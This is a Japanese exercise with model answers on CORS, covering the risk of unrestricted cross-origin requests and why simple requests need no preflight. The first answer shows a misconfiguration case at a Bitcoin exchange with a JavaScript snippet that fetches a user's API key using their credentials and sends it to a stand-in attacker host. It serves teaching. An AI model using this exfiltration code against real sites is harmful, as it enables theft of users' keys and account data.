## 問題

オリジン間リソース共有（CORS）について、以下の問いに答えなさい。

1. クロスオリジンリクエストに制約が無かった場合、どのような問題が発生するか述べなさい
2. クロスオリジンリクエストで メソッド(POST/GET)やリクエストの内容によって Preflight リクエストの有無が異なるのは何故か、その理由を述べなさい

## 解答

1. クロスオリジンリクエストに制約が無い場合、悪意のあるウェブサイトがユーザーの認証情報を利用して他のオリジンのリソースにアクセスし、個人情報や機密データを盗み出すことが可能になる。
   これにより、セキュリティ上の脆弱性が生じ、ユーザーのプライバシーが侵害される恐れがある。

   例えば、BitCoin取引所のAPIで[ユーザーのBitCoinを外部から窃取できる脆弱性](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)が発見された。
   この事例では、オリジンポリシーがワイルドカードになっていて、任意のオリジンからのリクエストを受け入れてしまう設定ミスによって実質的にCORS制約がない状態になっていた。

   ```
   GET /api/requestApiKey HTTP/1.1
   Host: <redacted>
   Origin: https://fiddle.jshell.net
   Cookie: sessionid=...

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://fiddle.jshell.net
    Access-Control-Allow-Credentials: true
   ```

   この脆弱性を突き、攻撃者は自分が作成した偽装サイト(attacker.com)を立ち上げ、そこにユーザーを誘導することで、任意のリクエスト(例えばユーザーのAPIキー取得)を行い、そのレスポンスを攻撃者のサーバーに送信することが可能となってしまった。

   ```javascript
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open("get", "https://btc-exchange/api/requestApiKey", true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
     location = "//attacker.net/log?key=" + this.responseText;
   }
   ```

   このように、クロスオリジンリクエストに制約が無いと、攻撃者が任意のオリジンからAPIアクセスしてそのレスポンスの内容を盗み出すことが可能となり、深刻なセキュリティ問題が発生する。

2. Preflightリクエストが必要ないのは、そのリクエストが[シンプルなリクエスト](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request)のである場合においてである。
   これらのシンプルなリクエストは<form>やfetch()よりも古くから存在するため、シンプルなリクエストによる攻撃のリスクはformやfetch()と同等程度だと考えられている。
   そのため、これらのリクエストに対してPreflightを要求するのは過剰なセキュリティ対策となり、パフォーマンスの低下を招くため、Preflightが不要とされている。
